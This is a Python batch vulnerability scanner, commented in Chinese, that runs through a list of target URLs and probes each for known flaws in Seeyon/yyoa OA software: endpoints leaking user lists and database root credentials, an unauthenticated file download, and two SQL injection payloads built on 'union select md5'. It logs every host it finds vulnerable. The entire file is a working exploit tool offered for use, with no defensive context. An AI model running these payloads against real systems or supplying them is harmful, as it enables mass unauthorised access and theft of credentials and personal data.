
import requests

urls = open('url.txt')

for i in urls:
    url = i.rstrip("\n")
    #initDataAssess.jsp用户信息泄露：
    poc = '/yyoa/assess/js/initDataAssess.jsp'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if 'personList[0]' in req.text:
            print("\n\033[1;32m[+]initDataAssess.jsp用户信息泄露\tpayload:\033[0m",vulnurl)
            with open('initDataAssess.jsp用户信息泄露.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass
    #index.jsp用户信息泄露：
    poc = '/seeyon/management/index.jsp'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if 'password' in req.text:
            print("\n\033[1;32m[+]index.jsp用户信息泄露\tpayload:\033[0m",vulnurl)
            with open('index.jsp用户信息泄露.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass
    #数据库账号信息泄露
    poc = '/yyoa/createMysql.jsp'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if 'root' in req.text:
            print("\n\033[1;32m[+]数据库账号信息泄露\tpayload:\033[0m",vulnurl)
            with open('数据库账号信息泄露.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass
    #未经授权下载
    poc = '/yyoa/DownExcelBeanServlet?contenttype=username&contentvalue=&state=1&per_id=0'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if req.status_code == 200:
            print("\n\033[1;32m[+]未经授权下载漏洞\tpayload:\033[0m",vulnurl)
            with open('未经授权下载漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass
    #test.jsp-sql注入
    poc = '/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(%27huayang%27))'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if '028eabbae79ac2e7a57cd3642d91dac5' in req.text:
            print("\n\033[1;32m[+]test.jsp-sql注入\tpayload:\033[0m",vulnurl)
            with open('test.jsp-sql注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass

    #setextno.jsp-sql注入
    poc = '/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=%2899999%29%20union%20all%20select%201,2,%28md5%281%29%29,4'
    vulnurl = url + poc
    try:
        req = requests.post(vulnurl, timeout=2, verify=False)
        if 'c4ca4238a0b923820dcc509a6f75849b' in req.text:
            print("\n\033[1;32m[+]setextno.jsp-sql注入\tpayload:\033[0m",vulnurl)
            with open('setextno.jsp-sql注入.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("\n\033[1;31m[-]不存在漏洞\033[0m",vulnurl)

    except:
        print('\n\033[1;31m[-]响应超时\033[0m')
        pass